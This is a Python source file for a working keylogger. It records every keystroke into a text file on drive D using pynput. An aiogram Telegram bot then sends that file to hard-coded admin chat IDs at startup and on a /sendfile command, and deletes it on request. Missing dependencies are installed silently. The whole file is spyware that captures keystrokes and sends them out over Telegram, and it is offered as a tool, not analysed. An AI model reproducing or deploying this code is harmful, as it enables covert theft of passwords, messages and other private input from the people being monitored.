import subprocess

# List of required modules
required_modules = ['aiogram==2.25.2', 'pytz==2023.3.post1', "pynput==1.7.6", "datetime"]

# Check if each required module is installed
for module in required_modules:
    try:
        import aiogram, pytz, pynput, datetime
    except ImportError:
        print(f"Installing {module}...")
        subprocess.check_call(['pip', 'install', module])
from datetime import datetime
import logging
import os
import pytz

from aiogram import Bot, Dispatcher, types, executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InputFile
from aiogram.utils.exceptions import (Unauthorized, InvalidQueryID, TelegramAPIError,
                                      CantDemoteChatCreator, MessageNotModified, MessageToDeleteNotFound,
                                      MessageTextIsEmpty, RetryAfter, CantParseEntities)

from pynput.keyboard import Listener

logging.basicConfig(format=u'%(filename)s [LINE:%(lineno)d] #%(levelname)-8s [%(asctime)s]  %(message)s',
                    level=logging.INFO,
                    # level=logging.DEBUG,  # Можно заменить на другой уровень логгирования.
                    )

# Set the time zone to Tashkent
tashkent_timezone = pytz.timezone('Asia/Tashkent')

# Get the current time in Tashkent
current_time = datetime.now(tashkent_timezone)

BOT_TOKEN = ""  # Bot token
ADMINS = ['1024522810']  # Admin chat IDs
keystroke_file = "d:/tdiu.txt"

if not os.path.exists(keystroke_file):
    with open(keystroke_file, "w"):
        pass  # Create an empty file

with open(keystroke_file, 'a') as file:
    file.write("\n" + current_time.strftime('%Y-%m-%d %H:%M:%S'+" "))


def on_press(key):
    with open(keystroke_file, "a") as f:
        f.write(str(key))


# Start keystroke recording
listener = Listener(on_press=on_press)
listener.start()

bot = Bot(token=BOT_TOKEN, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)


async def on_startup_notify(dp: Dispatcher):
    for admin in ADMINS:
        try:
            await dp.bot.send_message(admin, "Running")
            await dp.bot.send_document(chat_id=admin, document=InputFile('d:/tdiu.txt'))
        except Exception as err:
            logging.exception(err)


async def set_default_commands(dp):
    await dp.bot.set_my_commands(
        [
            types.BotCommand("sendfile", "get txt file"),
            types.BotCommand("delete_file", "delete txt file"),
        ]
    )

@dp.errors_handler()
async def errors_handler(update, exception):
    if isinstance(exception, (CantDemoteChatCreator, MessageNotModified, MessageToDeleteNotFound,
                              MessageTextIsEmpty, Unauthorized, InvalidQueryID,
                              TelegramAPIError, RetryAfter, CantParseEntities)):
        logging.exception(exception)
        return True

@dp.message_handler(state=None, commands=['delete_file'])
async def bot_delete_file(message: types.Message):
    try:
        os.remove(keystroke_file)
        await message.answer("File deleted successfully!")
    except Exception as e:
        await message.answer(f"Failed to delete file: {e}")

@dp.message_handler(state=None, commands=['sendfile'])
async def bot_echo(message: types.Message):
    try:
        await message.answer_document(InputFile(r'd:/tdiu.txt'))
    except Exception as e:
        await message.answer(str(e))


async def on_startup(dispatcher):
    await set_default_commands(dispatcher)
    await on_startup_notify(dispatcher)

if __name__ == '__main__':
    executor.start_polling(dp, on_startup=on_startup)
